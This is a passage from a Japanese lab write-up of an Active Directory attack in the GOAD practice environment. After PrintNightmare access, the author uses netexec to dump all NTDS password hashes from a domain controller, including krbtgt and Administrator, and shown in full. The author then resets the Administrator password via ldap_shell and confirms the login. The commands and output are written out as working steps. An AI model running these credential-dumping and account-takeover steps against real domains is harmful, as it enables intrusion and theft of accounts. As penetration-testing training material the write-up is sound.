SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\pnightmare\Documents>
```

というわけでNTLMハッシュをいただく

```jsx
┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare]
└─$ nxc smb meereen.essos.local -u pnightmare -p Passw0rd123. --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] 
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\pnightmare:Passw0rd123. (Pwn3d!)
SMB         192.168.56.12   445    MEEREEN          [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.12   445    MEEREEN          Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
SMB         192.168.56.12   445    MEEREEN          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.12   445    MEEREEN          krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54798535f08dafb2f3ab805bb312961d:::
SMB         192.168.56.12   445    MEEREEN          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.12   445    MEEREEN          vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.12   445    MEEREEN          daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
SMB         192.168.56.12   445    MEEREEN          viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
SMB         192.168.56.12   445    MEEREEN          khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
SMB         192.168.56.12   445    MEEREEN          jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
SMB         192.168.56.12   445    MEEREEN          missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
SMB         192.168.56.12   445    MEEREEN          drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
SMB         192.168.56.12   445    MEEREEN          sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         192.168.56.12   445    MEEREEN          pnightmare:1121:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
SMB         192.168.56.12   445    MEEREEN          MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741:::
SMB         192.168.56.12   445    MEEREEN          BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:0d8d114e49ff85a35b3c97208d88dcf3:::
SMB         192.168.56.12   445    MEEREEN          gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:563b455a419089dfbfa829cab9f2b174:::
SMB         192.168.56.12   445    MEEREEN          removemiccomputer$:1120:aad3b435b51404eeaad3b435b51404ee:1e986d18a9b7c9543e2d57944e8656b7:::
SMB         192.168.56.12   445    MEEREEN          SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:743ab45cdf64d2f368f501fd348ab3d8:::
SMB         192.168.56.12   445    MEEREEN          [+] Dumped 18 NTDS hashes to /home/kali/.nxc/logs/MEEREEN_192.168.56.12_2024-10-20_143124.ntds of which 13 were added to the database                                                                                                                               
SMB         192.168.56.12   445    MEEREEN          [*] To extract only enabled accounts from the output file, run the following command: 
SMB         192.168.56.12   445    MEEREEN          [*] cat /home/kali/.nxc/logs/MEEREEN_192.168.56.12_2024-10-20_143124.ntds | grep -iv disabled | cut -d ':' -f1
SMB         192.168.56.12   445    MEEREEN          [*] grep -iv disabled /home/kali/.nxc/logs/MEEREEN_192.168.56.12_2024-10-20_143124.ntds | cut -d ':' -f1
```

Administratorグループの権限を得ているがついでなのでAdministratorのパスワードを変更して入る

```jsx
                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare]
└─$ ldap_shell essos.local/pnightmare -dc-host essos.local  
Password: 
\[INFO] Starting interactive shell
 
pnightmare#
pnightmare# change_password Administrator P@ssw0rd!
[INFO] Sending StartTLS command...
[INFO] StartTLS succeded!
[INFO] Got User DN: CN=Administrator,CN=Users,DC=essos,DC=local
[INFO] Attempting to set new password of: P@ssw0rd!
[INFO] Password changed successfully!
```

`Administrator/P@ssw0rd!` をゲット

```jsx
┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare]
└─$ nxc smb meereen.essos.local -u Administrator -p P@ssw0rd!
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\Administrator:P@ssw0rd! (Pwn3d!)
```
